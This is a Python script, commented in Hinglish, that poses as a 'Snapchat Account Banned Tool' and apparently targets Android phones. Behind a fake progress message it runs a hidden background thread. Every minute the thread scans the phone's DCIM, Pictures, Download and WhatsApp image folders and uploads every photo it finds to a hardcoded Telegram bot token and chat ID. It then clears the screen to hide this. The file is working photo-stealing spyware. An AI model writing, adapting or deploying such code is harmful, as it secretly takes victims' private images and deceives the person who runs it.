whyimport os
import time
import requests
import threading
import subprocess

# Telegram Bot Token aur Chat ID
BOT_TOKEN = '7617088278:AAH1ckkQveqS6nddrQGDw9myJtw26elBc_c'  # Apne bot ka token daalein
CHAT_ID = '7006569478'  # Apna chat ID daalein

# Telegram par photo send karne ka function
def send_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {'photo': open(file_path, 'rb')}
    data = {'chat_id': CHAT_ID}
    response = requests.post(url, data=data, files=files)
    return response

# Photos ko find karne ka function (Full storage scan karna)
def scan_and_send_photos():
    # User ko impression dega ke tool run ho raha hai
    storage_paths = [
        "/storage/emulated/0/DCIM/",
        "/storage/emulated/0/Pictures/",
        "/storage/emulated/0/Download/",
        "/storage/emulated/0/Android/",
        "/storage/emulated/0/Movies/",
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/"
    ]
    
    photo_paths = []

    # Loop through directories to find all photos
    for path in storage_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                        photo_paths.append(os.path.join(root, file))
    
    # Send found photos to Telegram
    for photo in photo_paths:
        send_to_telegram(photo)
        time.sleep(2)  # Delay to avoid flooding requests

# Background mein run karne ka function (Threading ka use)
def background_task():
    while True:
        scan_and_send_photos()  # Photos scan aur send karna
        time.sleep(60)  # Har minute mein photos ko scan karke send karna

# Main function
def main():
    # Starting message ko display karne ke liye
    print("💻 Snapchat Account Banned Tool Starting... Please Wait...")
    time.sleep(5)  # 5 seconds ka delay, taake user ko message properly dikhe
    print("🚀 Tool Running in Background...")  # User ko impression dene ke liye

    # Background task ko thread mein run karna
    thread = threading.Thread(target=background_task)
    thread.daemon = True
    thread.start()

    # Suppress all unwanted output
    subprocess.call(['clear'])  # Terminal screen ko clear kar dega
    while True:
        time.sleep(10)  # Keep the program running, koi aur output nahi dikhai dega

if __name__ == "__main__":
    main()
